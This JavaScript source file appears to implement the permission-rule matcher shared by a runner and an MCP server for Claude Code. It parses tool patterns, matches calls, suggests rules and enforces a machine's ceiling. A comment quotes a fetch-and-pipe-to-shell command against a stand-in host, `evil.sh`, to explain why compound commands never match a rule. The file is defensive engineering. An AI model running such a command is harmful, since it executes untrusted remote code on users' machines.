// What a run may do, in Claude Code's own grammar — R51.
//
// One matcher, imported by both halves that need it:
//
//   - the RUNNER, which asks the platform for a project's live rules when it
//     claims a run, filters them through the machine's own ceiling, and hands
//     the survivors to the CLI as --allowedTools;
//   - the MCP SERVER, which is asked by the CLI's permission-prompt tool about
//     a call no rule covered, and has to answer the same question again for a
//     rule somebody added while the session was already running.
//
// Two copies of this would drift, and the direction they drift in is "the
// runner promised the agent something the server then denies", which reads to
// whoever is watching as the agent being broken.
//
// THIS IS NOT THE AUTHORITY ON PERMISSIONS. Claude Code is. Everything here
// exists to decide "has somebody already said yes to this" and "is this
// within what this machine allows unattended", and both must fail towards
// ASKING. A matcher that is unsure and says yes has quietly granted something;
// one that is unsure and says no has, at worst, asked a person a question they
// have answered before.

/**
 * A pattern, split into the tool and what it is allowed to do.
 *
 *   Bash(mvn *)          -> { tool: 'Bash', content: 'mvn *' }
 *   Bash                 -> { tool: 'Bash', content: null }   // the whole tool
 *   mcp__cawdev__report  -> { tool: 'mcp__cawdev__report', content: null }
 *
 * Null for anything else. An unparseable rule is not a rule that matches
 * everything.
 */
export function parseRule(pattern) {
  if (typeof pattern !== 'string') return null;
  const text = pattern.trim();
  if (!text) return null;

  const open = text.indexOf('(');
  if (open === -1) {
    return { tool: text, content: null };
  }
  if (!text.endsWith(')')) return null;

  const tool = text.slice(0, open).trim();
  const content = text.slice(open + 1, -1).trim();
  if (!tool) return null;
  return { tool, content: content || null };
}

/**
 * Whether a pattern's tool covers a call's tool.
 *
 * Exact, plus one case: **`mcp__<server>` covers every tool on that server**,
 * which is Claude Code's own reading of `--allowedTools mcp__github`. Verified
 * against 2.1.252 rather than assumed — a session given `mcp__claude-in-chrome`
 * and nothing else called `mcp__claude-in-chrome__tabs_context_mcp` without
 * being asked.
 *
 * Without this the two disagree, and they disagree in the worst direction: the
 * CLI would honour a server-wide grant at spawn while this matcher denied every
 * call under it mid-run, so a person who allowed the whole server would be
 * asked again about each of its twenty-six tools. Keeping one reading is the
 * entire reason this file exists.
 *
 * Split on the separator, never a raw prefix: `mcp__claude-in-chrome` must not
 * cover `mcp__claude-in-chrome-evil__navigate`, and `startsWith` alone would.
 */
function sameTool(ruleTool, toolName) {
  if (ruleTool === toolName) return true;
  if (!ruleTool.startsWith('mcp__') || !toolName.startsWith('mcp__')) return false;
  // A server-only pattern has exactly one `__` after the prefix; anything with
  // a tool on it is already covered by the equality above.
  return ruleTool.split('__').length === 2 && toolName.startsWith(`${ruleTool}__`);
}

/**
 * Shell metacharacters, which make a command more than one command.
 *
 * `mvn test && curl evil.sh | sh` starts with `mvn`, and a rule written from
 * its first word would say `Bash(mvn *)` — a rule whose plain reading is "may
 * run Maven" and whose actual effect is "may run anything". Claude Code splits
 * compound commands and checks the parts; we do not, so anything compound gets
 * no suggested rule and has to be allowed one call at a time.
 */
const COMPOUND = /[;&|`\n]|\$\(|>\(|<\(/;

/** The command a Bash call will run, or null for any other tool. */
function commandOf(toolName, input) {
  if (toolName !== 'Bash') return null;
  const command = input && typeof input.command === 'string' ? input.command.trim() : '';
  return command || null;
}

/**
 * Whether a pattern covers a call.
 *
 * A trailing `*` is a prefix match, which is Claude Code's own reading of
 * `Bash(npm run test:*)`. Without one the content must match the command
 * exactly. A pattern naming only a tool covers every call to it.
 */
export function matches(pattern, toolName, input) {
  const rule = parseRule(pattern);
  if (!rule) return false;
  if (!sameTool(rule.tool, toolName)) return false;
  if (rule.content === null) return true;

  const command = commandOf(toolName, input);
  if (command === null) {
    // A pattern with content, against a tool whose calls have no command to
    // compare. We do not know what it means, so it does not match.
    return false;
  }
  // Never settle a compound command from a rule. The rule was written about
  // one command and this is several, only the first of which anyone read.
  if (COMPOUND.test(command)) return false;

  if (rule.content === '*') return true;
  if (rule.content.endsWith('*')) {
    return command.startsWith(rule.content.slice(0, -1));
  }
  return command === rule.content;
}

/** The first pattern in the list that covers this call, or null. */
export function coveredBy(patterns, toolName, input) {
  for (const pattern of patterns ?? []) {
    if (matches(pattern, toolName, input)) return pattern;
  }
  return null;
}

/**
 * The one line a person decides on.
 *
 * Rendered here, on the machine, and stored by the platform as it was sent —
 * so what somebody approved is exactly what they were shown, however the
 * console later changes.
 */
export function summaryOf(toolName, input) {
  const command = commandOf(toolName, input);
  if (command) return command;

  // Not Bash: say what it is about in whatever the tool calls its subject.
  const subject = ['file_path', 'path', 'url', 'pattern', 'notebook_path']
    .map((key) => (input && typeof input[key] === 'string' ? input[key] : null))
    .find(Boolean);
  return subject ? `${toolName}: ${subject}` : toolName;
}

/**
 * The rule that would cover this next time, or null when none should be offered.
 *
 * For a shell command it is the program: `mvn --version` offers
 * `Bash(mvn *)`. Broad on purpose — it is what somebody means by "let it use
 * Maven" — and the console lets them narrow it before it is written.
 *
 * Null rather than a guess for: compound commands (see COMPOUND), and any tool
 * whose calls we cannot characterise, where the only honest offer would be the
 * whole tool. "Always allow Bash" is not a checkbox this should ever draw.
 */
export function suggestionFor(toolName, input, { skillServers = [] } = {}) {
  const command = commandOf(toolName, input);
  if (command === null) {
    if (!toolName.startsWith('mcp__')) return null;

    // A SKILL is one decision, so the offer is the whole server — R76.
    //
    // A project turned CodeGraph on, not `codegraph_explore`. Offering the one
    // tool would ask a person twenty-six times about a capability they have
    // already expressed as one thing, which is how a permission model people
    // read becomes one they click through. R61 verified that the CLI and
    // `matches` agree on a server-wide pattern, so this is a grant both halves
    // read the same way.
    //
    // Only for servers the runner declared as skills. Everything else — a
    // repository's own `.mcp.json` server, above all — keeps the per-tool
    // offer, because nobody declared it as a capability and its tools may have
    // nothing to do with each other.
    const server = skillServers.find((prefix) => sameTool(prefix, toolName));
    if (server) return server;

    // A named MCP tool is its own pattern and is as narrow as it gets.
    return toolName;
  }
  if (COMPOUND.test(command)) return null;

  const program = command.split(/\s+/)[0];
  if (!program || program.includes('/')) {
    // A path rather than a program — `./scripts/deploy.sh`. Offering
    // `Bash(./scripts/deploy.sh *)` is a rule about one file in one checkout,
    // which is not what a project rule is for.
    return null;
  }
  return `Bash(${program} *)`;
}

/**
 * Whether a machine's ceiling admits a rule.
 *
 * The ceiling is the list of patterns this runner's owner is willing to have
 * applied with nobody watching. A rule passes when the ceiling names it, or
 * names something broader that plainly contains it — `Bash(npm *)` in the
 * ceiling admits `Bash(npm test)`.
 *
 * Deliberately narrow. It compares patterns, never expands them: a ceiling of
 * `Bash(npm *)` does not admit `Bash(npm-run-all *)`, because the prefix test
 * is done on the wildcard boundary and not on the raw string.
 */
export function withinCeiling(ceiling, pattern) {
  const rule = parseRule(pattern);
  if (!rule) return false;

  for (const allowed of ceiling ?? []) {
    const limit = parseRule(allowed);
    // The same server-covers-its-tools reading as `matches`, so a ceiling of
    // `mcp__claude-in-chrome` admits a rule about one of its tools.
    if (!limit || !sameTool(limit.tool, rule.tool)) continue;

    // The ceiling names the whole tool: everything in it is admitted.
    if (limit.content === null || limit.content === '*') return true;
    if (rule.content === null) continue; // The rule is wider than the ceiling.

    if (limit.content.endsWith('*')) {
      const prefix = limit.content.slice(0, -1);
      if (rule.content === prefix.trim()) return true;
      if (rule.content.startsWith(prefix)) return true;
      continue;
    }
    if (limit.content === rule.content) return true;
  }
  return false;
}
